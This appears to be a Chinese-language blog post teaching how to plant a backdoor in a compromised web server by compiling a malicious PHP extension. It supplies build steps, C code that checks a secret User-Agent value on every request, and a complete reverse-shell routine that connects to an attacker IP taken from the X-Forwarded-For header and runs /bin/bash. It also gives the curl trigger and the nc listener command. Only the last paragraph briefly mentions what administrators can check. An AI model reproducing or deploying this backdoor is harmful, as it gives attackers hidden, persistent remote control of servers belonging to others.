#  别光查漏洞，换个思路，用 PHP 扩展留后门  
 幻泉之洲   2026-06-18 01:38  
  
>   
  
## 为什么是 PHP 扩展？  
  
对公网 web 服务器下手，几乎是每次渗透测试或者红队行动的固定节目。但问题是，进去容易，留下难。想要在目标网络里站稳脚跟，保持一个稳定的据点，你得动点脑子。通常的做法是，把好几种打洞的技术叠在一起用。不过，今天我们聊个不太一样的——直接在 XAMPP（OS/Apache/MySQL/PHP）的环境里，用 PHP 扩展做后门。  
  
.so 或者 .dll 文件这种东西，天生就比 webshell 更底层。它们不是一段脚本，而是被 PHP 解释器当自己人一样加载的二进制代码。这意味着，你的后门逻辑会在一个 web 请求还没碰到任何 PHP 脚本之前，就已经跑起来了。安全得多，也阴险得多。  
## 搞懂 PHP 扩展的生命线，才能动手  
  
PHP 扩展其实就是一组 C 写的函数库，用来给 PHP 加一些默认没有的功能。这些新功能可以在脚本里随便调用。你可以在 php.ini 里用 extension 指令让它自动加载，也可以在脚本里调用 dl() 函数动态加载——虽然后一种方法现在基本都因为安全原因被禁用了。  
  
但这些都不是关键。真正让扩展成为完美后门载体的，是它那几个可以挂载自定义代码的关键时刻：  
- PHP 解释器启动的时候  
- PHP 解释器关闭的时候  
- **最关键的一个：**任何一次 PHP 脚本请求开始执行的时候  
- 任何一次 PHP 脚本执行结束的时候  
重点看第三个。只要在这地方注入代码，就等于告诉服务器：“不管用户请求的是哪个页面，哪怕是个 404，我都得先替你把事儿办了。” 这个操作对目标脚本完全透明，也完全独立。你可以在这里调 system()、popen()，或者更直接一点——弹一个反向 shell 回来。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibc4Iq8KuC2VyUB3JwzcfoEQLb6mZJjqARGO5WX6WK5peJV0ichpZhyaBEu0pX3iaYZbYDE58SXgFzlEolLm0VamateCmhpwTMNw0/640?wx_fmt=png&from=appmsg "")  
  
▲ PHP 扩展生命周期  
  
我们设计的后门逻辑大概是这么个流程：  
1. 把恶意代码塞进 PHP 扩展的初始化钩子里，让它每次请求都跑一遍。  
1. 这段代码去检查 HTTP 请求里的 USER-AGENT 头，看里面有没有我们的暗号。  
1. 对上了，就接着读 X-FORWARDED-FOR 头，拿里面的 IP 地址当目标，送个反向 shell 过去。  
当然，这套路可以随便变。暗号可以藏在别的头里，触发 shell 的方式也能更隐蔽。全看你怎么玩。  
## 从零开始，搭一个后门扩展  
  
先得搞定编译环境。去 php.net 下载对应版本的 PHP 源码，然后解包、配置、编译：  
  
$ cd php5$ ./configure --with-config-file=/etc$ make  
  
别一股脑 make install，我们只是在本地编译，不需要替换系统里的 PHP。  
  
接着，用 PHP 源码里自带的 ext_skel 工具生成一个扩展的骨架：  
  
$ cd ext$ ./ext_skel --extname=backdoor$ cd backdoor  
  
这一步会生成一堆文件，核心是 backdoor.c。打开它，你会看到几个决定我们后门“安插位置”的函数钩子：  
- **PHP_FUNCTION()：**在这定义你能从 PHP 脚本里掉用的新函数。对我们来说，其实没什么用。  
- **PHP_MINIT_FUNCTION()：**模块初始化的时候跑一次。通常以 root 权限执行。想干点像复制 shell、加 suid 之类留后手的脏活，这地方不错。  
- **PHP_MSHUTDOWN_FUNCTION()：**模块关闭的时候执行。  
- **PHP_RINIT_FUNCTION()：**这里才是我们的主场。每一次处理脚本请求，**都会**跑这里的代码。我们的后门逻辑就埋这。  
- **PHP_RSHUTDOWN_FUNCTION()：**脚本执行完了跑一次。  
- **PHP_MINFO_FUNCTION()：**你从 phpinfo() 页面看到的信息。我们先改这块，当个指示灯，确认扩展装上了。  
先把指示灯点亮。找到 PHP_MINFO_FUNCTION 那部分，改成：  
  
PHP_MINFO_FUNCTION(backdoor){    php_info_print_table_start();    php_info_print_table_header(2, "PoC Backdoor", "enabled");    php_info_print_table_end();}  
  
然后，编辑同目录下的 config.m4 文件，把下面这几行的注释去掉，让编译系统识别我们的扩展：  
  
PHP_ARG_ENABLE(backdoor, whether to enable backdoor support, Make sure that the comment is aligned: [ --enable-backdoor           Enable backdoor support])  
  
准备工作搞定。现在按套路编译：  
  
$ phpize$ ./configure$ make  
  
如果看到 "Build complete" 的提示，而且 modules 文件夹下多了一个 .so 文件，就说明骨架跑通了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeiaOwqpGicTDoD0GgzQWRFtHP7tFricIdRuBrpa3L4BepKPkAHVz0lOpmUrPdOGWWvNia5QaBnOhKibGwoag8GXkfD0CfC0WnY0uXI/640?wx_fmt=png&from=appmsg "")  
  
▲ PHP扩展编译成功  
## 装上测试，看看灵不灵  
  
改一下 /etc/php5/apache2/php.ini（路径视你的环境而定），加上一行：  
  
extension=/your/path/to/the/modules/backdoor.so  
  
重启 Apache。之后随便找个能跑 phpinfo() 的页面看下，看到我们写的 "PoC Backdoor" 和 "enabled"，就说明扩展装上了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibeuufu3vYNuGKw4DXz6SIVNibmQUaBDelOHHlibcjZpsV6ApAeHfhLr9Mw702Hib8Ad2C2dJgAiaSqOEcW3nSUyE37HxRw3Iryrf2g/640?wx_fmt=png&from=appmsg "")  
  
▲ 检查phpinfo()，确认扩展已安装  
  
骨架没问题了。是该干正事儿的时候了。  
## 写下真正的后门逻辑：抓头、对暗号、弹 shell  
  
怎么在 C 扩展里拿到请求头信息？最好的办法不是瞎猜，是去看 PHP 自己的源码。在 php_variables.c 里，有个函数叫 php_register_server_variables，它专门负责把 $_SERVER 变量注册进内存里。从这下手就行。  
  
思路很简单：先判断 $_SERVER['HTTP_USER_AGENT'] 这个哈希表里有没有我们的暗号，比如 “ka0labs”。如果有，就去读 $_SERVER['HTTP_X_FORWARDED_FOR'] 的值，把它当成反向 shell 的目标 IP。代码如下：  
  
zval **http_user_agent;zval **http_forwarded;if ( zend_hash_exists(HASH_OF(PG(http_globals)[TRACK_VARS_SERVER]), ZEND_STRS("HTTP_USER_AGENT")) ) {    zend_hash_find(HASH_OF(PG(http_globals)[TRACK_VARS_SERVER]), ZEND_STRS("HTTP_USER_AGENT"), (void **)&http_user_agent);    if ((strcmp(Z_STRVAL_PP(http_user_agent), "ka0labs") == 0) && (zend_hash_exists(HASH_OF(PG(http_globals)[TRACK_VARS_SERVER]), ZEND_STRS("HTTP_X_FORWARDED_FOR")))) {        zend_hash_find(HASH_OF(PG(http_globals)[TRACK_VARS_SERVER]), ZEND_STRS("HTTP_X_FORWARDED_FOR"), (void **)&http_forwarded);        php_printf("Password: %sIP: %s", Z_STRVAL_PP(http_user_agent), Z_STRVAL_PP(http_forwarded));    }}  
  
别忘了在文件头里加上 sapi.h，这样我们才能复用它的服务端变量逻辑。重新编译，然后用 curl 试试：  
  
curl -H "User-Agent: ka0labs" -H "X-Forwarded-For: 127.0.0.1" http://目标IP/随便什么页面.php  
  
如果一切正常，页面上就会打印出我们的暗号和 IP。到了这一步，概念验证就算是完成了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibfJPUicD57J4z01AEY4Sm30wxtNfeBVs9vAiadGmqW1ymk5vOLBrKibVHrLDYMe2LfOtt0qxG30YQrESRj6b7ksQVxFbI2oOUjdJw/640?wx_fmt=png&from=appmsg "")  
  
▲ 扩展成功读取并显示我们自定义的HTTP头数据  
## 最后一步：把 PHP 请求变成 Shell 连接  
  
验证能抓到数据之后，把 php_printf 那行打印数据的代码换掉，换成一段经典的 C 反向 shell 逻辑：  
  
int sck;struct sockaddr_in rhost;unsigned short PORT = 31337; /* 端口 */rhost.sin_family = AF_INET;rhost.sin_port = htons(PORT);rhost.sin_addr.s_addr = inet_addr(Z_STRVAL_PP(http_forwarded));memset(&(rhost.sin_zero), '\0', 8);sck = socket(AF_INET, SOCK_STREAM, 0);connect(sck, (struct sockaddr *)&rhost, sizeof(rhost));if(!fork()){    setsid();    dup2(sck, 0);    dup2(sck, 1);    dup2(sck, 2);    dup2(sck, 3);    dup2(sck, 4);    dup2(sck, 5);    execl("/bin/bash", "/bin/bash", NULL);    close(sck);}  
  
这段代码干的事很直接：建个 socket，连到 X-FORWARDED-FOR 头里指定的 IP 和端口，然后 fork 一个子进程，把它的标准输入输出全扔到这个 socket 上，最后执行 /bin/bash。你的攻击机上先开个 nc -lvp 31337，然后用 curl 带着特制的 HTTP 头去访问目标站任意网址，shell 就弹回来了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibcW6TicpQMKgZkCiaaLibuTDFEEujfdI5dvgQfTEfpeW4ibAlTDPJ16XPD5A8HEGA7MXL1m5qaq5QGnEQpgqmM3rdK26NLmvnCMiaCI/640?wx_fmt=png&from=appmsg "")  
  
▲ 使用 curl 发送特殊请求头后，收到反向 shell  
  
从零开始创建一个恶意的 PHP 扩展，然后拿回一个已经被攻破的 web 服务器控制权，这事就这么简单。对于管理员来说，光盯着 webshell 和那几个关键文件是不够的。php.ini 里有没有被加料，已经装了的扩展是不是被偷偷换过，这些都得查。对于攻击者而言，公网上的 web 服务器永远是最香的那块肉。一个合理的系统加固，配上定期的安全审计，才勉强能挡住一部分坏心思。  
### 参考资料  
  
[1]   
https://www.tarlogic.com/blog/backdoors-in-xamp-stack-part-ii-udf-in-mysql/  
  
[2]   
https://www.tarlogic.com/blog/backdoors-modules-apache/  
  
[3]   
https://www.tarlogic.com/blog/backdoors-php-extensions/  
  
